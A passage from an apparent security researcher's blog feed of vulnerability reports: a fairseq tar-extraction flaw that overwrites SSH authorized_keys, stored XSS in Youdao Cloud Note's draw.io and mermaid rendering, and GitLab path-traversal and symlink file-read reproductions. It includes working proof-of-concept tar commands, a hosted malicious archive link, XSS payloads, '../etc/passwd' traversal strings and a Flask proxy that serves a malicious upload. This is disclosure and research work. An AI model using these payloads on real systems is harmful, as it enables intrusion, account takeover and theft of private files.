    # Extract archive to temp dir and replace .tar.bz2 if necessary
    tempdir = None
    if not os.path.isdir(resolved_archive_file):
        tempdir = tempfile.mkdtemp()
        logger.info(
            "extracting archive file {} to temp dir {}".format(
                resolved_archive_file, tempdir
            )
        )
        ext = os.path.splitext(archive_file)[1][1:]
        with tarfile.open(resolved_archive_file, "r:" + ext) as archive:
            top_dir = os.path.commonprefix(archive.getnames())
            archive.extractall(tempdir)
        os.remove(resolved_archive_file)
        shutil.move(os.path.join(tempdir, top_dir), resolved_archive_file)
        shutil.rmtree(tempdir)

    return resolved_archive_file
</code></pre></div></div>

<p>During the testing, I found the file to be overwrite is missing. By reading the source code carefully, it uses <code class="language-plaintext highlighter-rouge">shutil.move</code> to move files extracted to <code class="language-plaintext highlighter-rouge">resolved_archive_file</code> target. The move source is from <code class="language-plaintext highlighter-rouge">os.path.join(tempdir, top_dir)</code> and <code class="language-plaintext highlighter-rouge">top_dir</code> is from <code class="language-plaintext highlighter-rouge">os.path.commonprefix(archive.getnames())</code>. Well, this is controlled by attacker, in <a href="https://docs.python.org/3/library/os.path.html#os.path.commonprefix">Python documents</a>, when list contains both abs and relative pathnames, it will return empty string in which attacker can include abs and relative names in tar file, and then <code class="language-plaintext highlighter-rouge">move</code> source will be <code class="language-plaintext highlighter-rouge">tempdir</code> which bypass the <code class="language-plaintext highlighter-rouge">shutil.move</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; os.path.commonprefix(['/home/kali/.ssh/xx', '404.html'])
  ''
&gt; os.path.join("/root/tmp/","")
  '/root/tmp/'
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>An attacker can create a malicous tar file using following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -cvf hack.tar /home/kali/.ssh/authorized_keys 404.html
</code></pre></div></div>

<p>Then, the attacker will upload the <code class="language-plaintext highlighter-rouge">hack.tar</code> to public server.</p>

<p>I have uploaded one malicous tar file for testing: <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar">https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar</a></p>

<p>If anyone now downloads tar using <code class="language-plaintext highlighter-rouge">from_pretrained</code> api, causing automatically extracting the malicous tar file and overwrite files silently.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from fairseq.models.transformer import TransformerModel
model = TransformerModel.from_pretrained('https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar')
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; cat /home/kali/.ssh/authorized_keys
ssh-rsa xxx hacker@test.com
</code></pre></div></div>

<p>Tested on Google Colab: <a href="https://colab.research.google.com/drive/1AY9iqw_FdTvMGoqaDseX8jCnSGV9qCq6?usp=sharing">https://colab.research.google.com/drive/1AY9iqw_FdTvMGoqaDseX8jCnSGV9qCq6?usp=sharing</a></p>

<p><img src="https://live.staticflickr.com/65535/53639482085_b57cae8712_k.jpg" alt="poc" /></p>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>

<h3 id="ssh-access">SSH Access</h3>

<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>

<h3 id="web-servers">Web Servers</h3>

<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90">https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：有道云笔记网页端渲染流程图存在存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/03/17/xss-drawio.html" rel="alternate" type="text/html" title="中危：有道云笔记网页端渲染流程图存在存储型XSS漏洞" /><published>2024-03-17T10:26:18+08:00</published><updated>2024-03-17T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/03/17/xss-drawio</id><content type="html" xml:base="http://localhost:4000/xss/2024/03/17/xss-drawio.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>有道云笔记网页端渲染流程图存在存储型XSS漏洞</p>
</blockquote>

<h2 id="weakness">Weakness</h2>
<blockquote>
  <p>存储型XSS</p>
</blockquote>

<h2 id="severity">Severity</h2>
<blockquote>
  <p>中危</p>
</blockquote>

<h2 id="url">URL</h2>
<ul>
  <li>POC网页: <a href="https://note.youdao.com/s/QJo17hDz">https://note.youdao.com/s/QJo17hDz</a></li>
  <li>视频链接：POC视频链接：<a href="https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ">https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ</a> 提取码：1314</li>
</ul>

<h2 id="key-payload">Key Payload</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;mxfile host="Electron" modified="2022-05-01T12:59:04.467Z" agent="5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) draw.io/17.4.2 Chrome/100.0.4896.60 Electron/18.0.1 Safari/537.36" etag="kiR_NjkTd37TBbovy8cU" compressed="false" version="17.4.2" type="device"&gt;
  &lt;diagram id="_Y4cO9PIdA5klW6TnyFV" name="Page-1"&gt;
    &lt;mxGraphModel dx="1102" dy="714" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="291" pageHeight="413" math="0" shadow="0"&gt;
      &lt;root&gt;
        &lt;mxCell id="0" /&gt;
        &lt;mxCell id="1" parent="0" /&gt;
        &lt;UserObject label="&amp;lt;select&gt;&amp;lt;iframe&gt;&amp;lt;/select&gt;&amp;lt;img src=x onerror=alert(document.domain)&gt;" tooltip="" id="kX_el6IuBEZSOJuKbBye-1"&gt;
          &lt;mxCell style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1"&gt;
            &lt;mxGeometry x="150" y="170" width="90" height="40" as="geometry" /&gt;
          &lt;/mxCell&gt;
        &lt;/UserObject&gt;
      &lt;/root&gt;
    &lt;/mxGraphModel&gt;
  &lt;/diagram&gt;
&lt;/mxfile&gt;
</code></pre></div></div>

<h2 id="summary">Summary</h2>

<p>网易有道云笔记可以上传流程图笔记，该笔记是xml格式的drawio文件。有道云笔记采用drawio插件对该文件进行渲染，然而，该插件版本过时并且存在存储型XSS漏洞。由于笔记可以分享，将分享链接发送给受害者后，即可控制受害者客户端，由此能够获取受害者的所有笔记和笔记内容，造成严重的用户隐私数据泄露。</p>

<h3 id="detail">Detail</h3>

<h4 id="trigger">Trigger</h4>
<ol>
  <li>
    <p>将下面payload保存为drawio文件，命名为xss.drawio。</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;mxfile host="Electron" modified="2022-05-01T12:59:04.467Z" agent="5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) draw.io/17.4.2 Chrome/100.0.4896.60 Electron/18.0.1 Safari/537.36" etag="kiR_NjkTd37TBbovy8cU" compressed="false" version="17.4.2" type="device"&gt;
 &lt;diagram id="_Y4cO9PIdA5klW6TnyFV" name="Page-1"&gt;
     &lt;mxGraphModel dx="1102" dy="714" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="291" pageHeight="413" math="0" shadow="0"&gt;
     &lt;root&gt;
         &lt;mxCell id="0" /&gt;
         &lt;mxCell id="1" parent="0" /&gt;
         &lt;UserObject label="&amp;lt;select&gt;&amp;lt;iframe&gt;&amp;lt;/select&gt;&amp;lt;img src=x onerror=alert(document.domain)&gt;" tooltip="" id="kX_el6IuBEZSOJuKbBye-1"&gt;
         &lt;mxCell style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1"&gt;
             &lt;mxGeometry x="150" y="170" width="90" height="40" as="geometry" /&gt;
         &lt;/mxCell&gt;
         &lt;/UserObject&gt;
     &lt;/root&gt;
     &lt;/mxGraphModel&gt;
 &lt;/diagram&gt;
 &lt;/mxfile&gt;
</code></pre></div>    </div>
  </li>
  <li>
    <p>登录有道云笔记，<a href="https://note.youdao.com/">https://note.youdao.com/</a>. 点击左上侧“新建”，选择“上传文件”，将上一步的文件上传。</p>

    <p><img src="/assets/images/youdaoyun2/save.png" alt="save" /></p>
  </li>
  <li>
    <p>上传后，打开上传的流程图，xss触发。</p>

    <p><img src="/assets/images/youdaoyun2/drawxss.png" alt="drawxss" /></p>
  </li>
  <li>
    <p>将该笔记分享，发送给受害者打开，同样触发xss。</p>

    <p><img src="/assets/images/youdaoyun2/share.png" alt="share" /></p>
  </li>
  <li>
    <p>原因：drawio原始文件中，没有对UserObject元素的label字段进行过滤，导致label字段的xss得到执行。详见：<a href="https://github.com/jgraph/drawio/discussions/2791">https://github.com/jgraph/drawio/discussions/2791</a></p>
  </li>
</ol>

<h3 id="proof">Proof</h3>
<p>请提供截图或视频</p>

<p>POC视频链接：<a href="https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ">https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ</a>
提取码：1314</p>

<h2 id="impact">Impact</h2>

<p>该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。</p>

<h2 id="patch-advice">Patch advice</h2>

<ol>
  <li>升级渲染drawio的插件到最新版本</li>
</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：有道云笔记markdown模式渲染类图(classDiagram)存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/03/16/xss-milkdown.html" rel="alternate" type="text/html" title="中危：有道云笔记markdown模式渲染类图(classDiagram)存储型XSS漏洞" /><published>2024-03-16T10:26:18+08:00</published><updated>2024-03-16T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/03/16/xss-milkdown</id><content type="html" xml:base="http://localhost:4000/xss/2024/03/16/xss-milkdown.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>网易有道云笔记markdown模式渲染classDiagram存在存储型XSS漏洞</p>
</blockquote>

<h2 id="weakness">Weakness</h2>
<blockquote>
  <p>存储型XSS</p>
</blockquote>

<h2 id="severity">Severity</h2>
<blockquote>
  <p>中危</p>
</blockquote>

<h2 id="url">URL</h2>
<ul>
  <li>POC网页: <a href="https://note.youdao.com/s/2mc9Wfft">https://note.youdao.com/s/2mc9Wfft</a></li>
  <li>视频链接：POC视频链接：<a href="https://pan.baidu.com/s/1GHxB356yrwWsILMcGRzk4A">https://pan.baidu.com/s/1GHxB356yrwWsILMcGRzk4A</a> 提取码：1314</li>
</ul>

<h2 id="key-payload">Key Payload</h2>

<h2 id="summary">Summary</h2>

<p>网易有道云笔记可以创建markdown笔记，该笔记中可插入mermaid类图。在构建过程中，该种类图的节点名称可以注入xss payload，milkdown插件未将该payload进行过滤，而是直接渲染执行，造成存储型xss攻击。由于笔记可以分享，将分享链接发送给受害者后，即可控制受害者客户端，由此能够获取受害者的所有笔记和笔记内容，造成严重的用户隐私数据泄露。</p>

<h3 id="detail">Detail</h3>

<h4 id="trigger">Trigger</h4>
<ol>
  <li>
    <p>登录有道云笔记，<a href="https://note.youdao.com/">https://note.youdao.com/</a>. 点击左上侧“新建”，选择“Markdown”。</p>

    <p><img src="/assets/images/youdaoyun/new-note.png" alt="newnote" /></p>
  </li>
  <li>
    <p>进入markdown笔记编辑器，点击“更多”，下拉菜单选择“类图”。</p>

    <p><img src="/assets/images/youdaoyun/more.png" alt="more" /></p>
  </li>
  <li>
    <p>在类图的代码构建框中，填入以下payload，随即出现xss弹框。注意，xss在类图的节点名称中得到注入。</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
 Class01 &lt;|-- `AveryLongClass&lt;img src='x' onerror=alert(document.domain)&gt;`
 Class03 *-- Class04
 Class05 o-- Class06
 Class07 .. Class08
 Class01 : size()
 Class01 : int chimp
 Class01 : int gorilla
</code></pre></div>    </div>
    <p>xss弹框触发：</p>

    <p><img src="/assets/images/youdaoyun/xss.png" alt="xss" /></p>
  </li>
  <li>
    <p>点击右上角分享按钮，生成分享链接。在新窗口打开分享的笔记链接，xss同样触发。</p>

    <p>分享笔记：</p>

    <p><img src="/assets/images/youdaoyun/share.png" alt="share" /></p>

    <p>打开分享的笔记：</p>

    <p><img src="/assets/images/youdaoyun/share-xss.png" alt="sharexss" /></p>
  </li>
  <li>
    <p>原因：Milkdown第三方插件的漏洞，经过测试在milkdown最新版本v7.3.5得到验证。已在官方仓库提交漏洞issue。详见：<a href="https://github.com/Milkdown/milkdown/issues/1267">https://github.com/Milkdown/milkdown/issues/1267</a></p>
  </li>
</ol>

<h3 id="proof">Proof</h3>
<p>请提供截图或视频</p>

<p>POC视频链接：<a href="https://pan.baidu.com/s/1GHxB356yrwWsILMcGRzk4A">https://pan.baidu.com/s/1GHxB356yrwWsILMcGRzk4A</a>
提取码：1314</p>

<h2 id="impact">Impact</h2>

<p>该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。</p>

<h2 id="patch-advice">Patch advice</h2>

<ol>
  <li>对类图的node名称进行xss过滤</li>
</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Reproduction: Gitlab Arbitrary file read via the bulk imports UploadsPipeline</title><link href="http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html" rel="alternate" type="text/html" title="Reproduction: Gitlab Arbitrary file read via the bulk imports UploadsPipeline" /><published>2024-01-15T10:31:06+08:00</published><updated>2024-01-15T10:31:06+08:00</updated><id>http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports</id><content type="html" xml:base="http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Gitlab Arbitrary file read via the bulk imports UploadsPipeline</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>path-traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>高危</p>
</blockquote>

<h2 id="environment">Environment</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GitLab information

Version: 14.6.0-ee
Directory: /opt/gitlab/embedded/service/gitlab-rails
</code></pre></div></div>

<blockquote>
  <p>原文：<a href="https://hackerone.com/reports/1439593">https://hackerone.com/reports/1439593</a></p>
</blockquote>

<p><strong>Gitlab Docker</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run --detach \
  --hostname 10.206.44.20 \
  --publish 4435:443 --publish 8035:80 --publish 2235:22 \
  --name gitlab14.6 \
  --restart always \
  --shm-size 256m \
  gitlab/gitlab-ee:14.6.0-ee.0
</code></pre></div></div>

<h2 id="summary">Summary</h2>

<p>Group导入，从其他gitlab instance导入，被导入的group milestone中的附件会形成压缩文件，并且下载到后端。而后端在解压时，没有对压缩包的symlink进行去除，导致该链接文件指向的任意文件被读取和导入。造成任意文件读取漏洞。</p>

<h3 id="methods-flow">Methods flow</h3>

<p>触发该行为的controller：
<em>app/controllers/import/bulk_imports_controller.rb:43</em></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def create
    responses = create_params.map { |entry| ::BulkImports::CreateService.new(current_user, entry, credentials).execute }

    render json: responses.map { |response| { success: response.success?, id: response.payload[:id], message: response.message } }
end
</code></pre></div></div>

<p>文件解压采用popen执行命令方式：
<em>lib/gitlab/import_export/command_line_util.rb</em></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def untar_with_options(archive:, dir:, options:)
    execute_cmd(%W(tar -#{options} #{archive} -C #{dir}))
    execute_cmd(%W(chmod -R #{UNTAR_MASK} #{dir}))
end
</code></pre></div></div>

<p>解压后对文件进行移动或者上传:
<em>app/services/upload_service.rb</em></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def execute
    return unless file &amp;&amp; file.size &lt;= max_attachment_size

    uploader = uploader_class.new(model, nil, **uploader_context)
    uploader.store!(file)

    uploader
end
</code></pre></div></div>
<p>其中store!函数是carrierwave库的内置函数，用于移动文件。</p>

<h3 id="analysis">Analysis</h3>

<p>对carrierwave库进行demo测试，发现carrierwave的store!方法能够直接读取symlink指向的文件内容并且进行存储,对carrierwave进行文件操作测试：</p>

<ol>
  <li>测试路径穿越</li>
  <li>测试symlink读取和写入</li>
</ol>

<p>参考：<a href="https://www.youtube.com/watch?v=4VkKmQWJoBI">Uploading files in Rails 5</a></p>

<ol>
  <li>create app: <code class="language-plaintext highlighter-rouge">rails new Carrierwave</code></li>
  <li>add carrierwave to gemfile: <code class="language-plaintext highlighter-rouge">gem 'carrierwave', '~&gt; 3.0'</code></li>
  <li><code class="language-plaintext highlighter-rouge">bundle install</code></li>
  <li>create uploader:  <code class="language-plaintext highlighter-rouge">rails generate uploader File</code></li>
  <li>create scaffold: <code class="language-plaintext highlighter-rouge">rails generate scaffold Test image:string</code></li>
  <li>add <code class="language-plaintext highlighter-rouge">mount_uploader :image, FileUploader</code> to test.rb model</li>
  <li>migrate db: <code class="language-plaintext highlighter-rouge">bin/rails db:migrate</code></li>
  <li>change add image view: app/view/test/_form
 a. <code class="language-plaintext highlighter-rouge">&lt;%= form.file_field :image %&gt;</code></li>
  <li>start server: <code class="language-plaintext highlighter-rouge">bin/rails s -b 0.0.0.0</code></li>
  <li>open: localhost:3000/tests to upload image</li>
  <li><code class="language-plaintext highlighter-rouge">bin/rails console</code> to debug:(prepare file: <code class="language-plaintext highlighter-rouge">ln -s /etc/passwd /home/kali/test</code>)
    <ul>
      <li>initialize
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u = Test.new
  u.id = 1
  b = File.open("/home/kali/test")
  u.image.store!(b)
  check file content: /home/kali/rubyprojects/Carrierwave/public/uploads/test/image/1/test
</code></pre></div>        </div>
      </li>
      <li>Uploader:: retrieve_from_store!方法：存在目录穿越问题
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u.image.retrieve_from_store!('../../../../../../../../../../../etc/passwd')
  u.image.file
  #&lt;CarrierWave::SanitizedFile:0x00007f7daa7cfe50
      @content=nil,
      @content_type=nil,
      @declared_content_type=nil,
      @file="/etc/passwd",
      @original_filename=nil&gt;
</code></pre></div>        </div>
      </li>
      <li>Uploader:: retrieve_from_store!方法配合copy_to方法：通过目录穿越读取任意文件
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u.image.retrieve_from_store!('../../../../../../../../../../../etc/passwd')
  u.image.file
  #&lt;CarrierWave::SanitizedFile:0x00007f7da8c38ea8
      @content=nil,
      @content_type=nil,
      @declared_content_type=nil,
      @file="/etc/passwd",
      @original_filename=nil&gt;
  b = File.open('/home/kali/test')
  u.image.file.copy_to(b)
  那么u.image.file指向的/etc/passwd会拷贝到文件/home/kali/test
</code></pre></div>        </div>
      </li>
      <li>CarrierWave::SanitizedFile copy_to方法：存在读取链接文件问题
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u.image.retrieve_from_store!('../../../../../../../../../../../home/kali/link') # link指向/etc/passwd
  u.image.file
  #&lt;CarrierWave::SanitizedFile:0x00007f7da89fc0b8
      @content=nil,
      @content_type=nil,
      @declared_content_type=nil,
      @file="/home/kali/link",
      @original_filename=nil&gt;
  u.image.file.copy_to(File.open('/home/kali/blank')) # 此时，blank文件被拷贝了passwd内容
</code></pre></div>        </div>
      </li>
      <li>CarrierWave::SanitizedFile store!方法：存在读取链接文件问题
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u.image.store!(File.open("/home/kali/link")) # link指向/etc/passwd，此时，passwd内容被存储进model的内部空间
</code></pre></div>        </div>
      </li>
      <li>CarrierWave::SanitizedFile store!方法：测试写入链接文件能力，无该问题
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u.image.retrieve_from_store!('../../../../../../../../../../../home/kali/test2') # test2指向test
  u.image.store!(File.open("/home/kali/test3")) # 写入内容失败，原因是store!只会写入model指向的空间
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
</ol>

<h2 id="tips">Tips</h2>

<ol>
  <li>get all routes of rails app:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> gitlab-rails routes &gt; routes.txt
</code></pre></div>    </div>
  </li>
  <li>create symlink and compress to tar.gz, extract tar.gz file to folder:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ln -s /etc/passwd passwd
    
 tar –czf test.tar.gz passwd
    
 tar –xzf test.tar.gz -c /tmp/data
</code></pre></div>    </div>
  </li>
  <li>import burpsuite cert:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> apt-get install -y ca-certificates
 convert burp.der to burp.crt format
 sudo openssl x509 -inform der -outform pem -in burp.der -out burp.crt
 copy burp.crt to ca loaction:
 sudo cp burp.crt /usr/local/share/ca-certificates/
 # 参考：https://docs.gitlab.com/omnibus/settings/ssl/index.html#using-a-custom-certificate-chain，gitlab自身配置了新地方
 sudo cp burp.crt /etc/gitlab/trusted-certs/
 sudo update-ca-certificates
 gitlab-ctl reconfigure 
</code></pre></div>    </div>
  </li>
  <li>路径穿越，并且进行拷贝
    <ul>
      <li>fileK = retrieve_from_store!的参数为路径字符串，传入 ../ 能够索引到任意文件，类似于File.open()</li>
      <li>copy_to的参数为file句柄，指向某文件路径。fileK调用该函数能够将上一步的任意文件拷贝到指定路径</li>
    </ul>
  </li>
  <li>路径穿越读取链接文件，拷贝链接文件指向内容
    <ul>
      <li>fileK = retrieve_from_store!的参数为路径字符串，传入 ../ 能够索引到任意文件，类似于File.open()，也可以索引到链接文件</li>
      <li>copy_to的参数为file句柄，指向某文件路径。fileK调用该函数能够将上一步的链接文件指向内容拷贝到指定路径</li>
    </ul>
  </li>
  <li>直接读取链接文件指向内容
    <ul>
      <li>store!的参数是File句柄，当该句柄指向链接文件，那么可以读取链接文件内容。配合解压后的文件包含的链接文件。</li>
    </ul>
  </li>
  <li>文件解压操作，命令行方式以及第三方库方式</li>
  <li>
    <p>ngrok伪造服务器，进行流量分发：</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> from flask import Flask, request, Response, send_file
 import requests

 app = Flask(__name__)
 HTTP_METHODS = ['GET', 'HEAD', 'POST', 'PUT',
                 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH']

 def do_proxy(request, path):
     excluded_headers = ['content-encoding',
                         'content-length', 'transfer-encoding', 'connection', 'host']

     headers = [(name, value) for (name, value) in request.headers
             if name.lower() not in excluded_headers]

     host = request.headers["host"]
     if host.endswith("ngrok.io"):
         host = "gitlab.com"
            
     resp = requests.request(
         url=f'https://{host}/{path}?{request.query_string.decode()}', method=request.method, headers=dict(headers), data=request.data)
        
     headers = [(name, value) for (name, value) in resp.raw.headers.items()
             if name.lower() not in excluded_headers]
     response = Response(resp.content, resp.status_code, headers)
     return response

 @app.route('/', defaults={'path': ''}, methods=HTTP_METHODS)
 @app.route('/&lt;path:path&gt;', methods=HTTP_METHODS)
 def proxy(path):
     # 对流量进行过滤，对于含有漏洞的请求，发送payload
     if request.method == "GET" and request.query_string == b"relation=uploads":
         return send_file("uploads.tar.gz", as_attachment=True, mimetype="application/octet-stream")
     else:
         # 其他正常请求，发送到gitlab服务器处理
         return do_proxy(request, path)

</code></pre></div>    </div>
  </li>
</ol>]]></content><author><name></name></author><category term="path-traversal" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Reproduction: Gitlab Arbitrary file read via the UploadsRewriter when moving and issue</title><link href="http://localhost:4000/path-traversal/2024/01/10/arbitrary-file-read-via-the-uploadsRewriter.html" rel="alternate" type="text/html" title="Reproduction: Gitlab Arbitrary file read via the UploadsRewriter when moving and issue" /><published>2024-01-10T10:31:06+08:00</published><updated>2024-01-10T10:31:06+08:00</updated><id>http://localhost:4000/path-traversal/2024/01/10/arbitrary-file-read-via-the-uploadsRewriter</id><content type="html" xml:base="http://localhost:4000/path-traversal/2024/01/10/arbitrary-file-read-via-the-uploadsRewriter.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Gitlab Arbitrary file read via the UploadsRewriter when moving and issue</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>path-traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>高危</p>
</blockquote>

<h2 id="environment">Environment</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GitLab information

Version: 12.8.7-ee
Revision: 2643fd87200
Directory: /opt/gitlab/embedded/service/gitlab-rails
</code></pre></div></div>

<blockquote>
  <p>原文：<a href="https://hackerone.com/reports/827052">https://hackerone.com/reports/827052</a></p>
</blockquote>

<p><strong>Gitlab Docker</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run --detach \
  --hostname 10.206.44.20 \
  --publish 4433:443 --publish 8033:80 --publish 2233:22 \
  --name gitlab \
  --restart always \
  --shm-size 256m \
  gitlab/gitlab-ee:12.8.7-ee.0
</code></pre></div></div>

<p><strong><a href="https://docs.gitlab.com/ee/security/reset_user_password.html#use-a-rails-console">重置root密码失败解决方法</a></strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gitlab-rails console
user = User.find_by_username 'root'
new_password = "abcd1234"
user.password = new_password
user.password_confirmation = new_password
user.password_automatically_set = false
user.skip_reconfirmation!
user.save!
</code></pre></div></div>

<p><strong>配置debugger</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. 下载ruby2.6.5，推荐用asdf编译，更方便快捷。手动编译：编译：https://www.ruby-lang.org/en/documentation/installation/#building-from-source
2. 拷贝编译后的include文件夹到/opt/gitlab/embedded/
3. 添加pry-debug库到Gemfile：/opt/gitlab/embedded/service/gitlab-rails/Gemfile  gem 'pry-byebug', '~&gt; 3.5.1'
4. 执行bundle install，下载debug库
5. 其他步骤见环境配置文章
</code></pre></div></div>

<p><strong>拷贝源码/opt/gitlab/embedded/service/gitlab-rails，vscode查看</strong></p>

<h2 id="url">URL</h2>

<h2 id="summary">Summary</h2>

<h3 id="methods-flow">Methods flow</h3>

<script src="/assets/js/mermaid.min.js"></script>
<div class="mermaid">
flowchart
    classDef red color:#022e1f,fill:#f11111;
    B[ContentRewriter.execute\napp/services/issuable/clone/content_rewriter.rb]--&gt;A[UploadsRewriter.rewrite\nlib/gitlab/gfm/uploads_rewriter.rb]:::red
    C[BaseService.execute\napp/services/issuable/clone/base_service.rb]--&gt;B
    D[MoveService.execute\napp/services/issues/move_service.rb]--&gt;C
    E[UpdateService.move_issue_to_new_project\napp/services/issues/update_service.rb]--&gt;D
    F[IssuesController.move\napp/controllers/projects/issues_controller.rb]--&gt;E
</div>

<p>可以看到issues页面提供move动作如下：</p>

<p><a href="http://10.206.44.20:8033/root/bb/issues/1">http://10.206.44.20:8033/root/bb/issues/1</a></p>

<p><img src="/assets/gitlab/2/issues_move.png" alt="issues_move" /></p>

<p>设置断点验证成功：</p>

<p><img src="/assets/gitlab/2/issues_debug.png" alt="issues_debug" /></p>

<h3 id="data-flow">Data flow</h3>

<script src="/assets/js/mermaid.min.js"></script>
<div class="mermaid">
flowchart
    classDef red color:#022e1f,fill:#f11111;
    B[ContentRewriter.execute @original_entity\napp/services/issuable/clone/content_rewriter.rb]--&gt;A[UploadsRewriter.rewrite @text \nlib/gitlab/gfm/uploads_rewriter.rb]:::red
    C[BaseService.execute @original_entity\napp/services/issuable/clone/base_service.rb]--&gt;B
    D[MoveService.execute issue\napp/services/issues/move_service.rb]--&gt;C
    E[UpdateService.move_issue_to_new_project issue\napp/services/issues/update_service.rb]--&gt;D
    F[IssuesController.move issue\napp/controllers/projects/issues_controller.rb]--&gt;E
</div>

<h3 id="payload">Payload</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[xx](/uploads/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../../../../../../etc/passwd)
</code></pre></div></div>

<h3 id="analysis">Analysis</h3>

<ol>
  <li>首先需要过判断，判断该文件是否存在，判断的逻辑有些复杂，其中路径穿越在判断文件之前存在，用的是CarrierWave.retrieve_from_store!方法
 <em>app/uploaders/object_storage.rb:44</em>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> def retrieve_from_store!(identifier)
     paths = upload_paths(identifier)

     unless current_upload_satisfies?(paths, model)
         # the upload we already have isn't right, find the correct one
         self.upload = model&amp;.retrieve_upload(identifier, paths)
     end

     super
 end
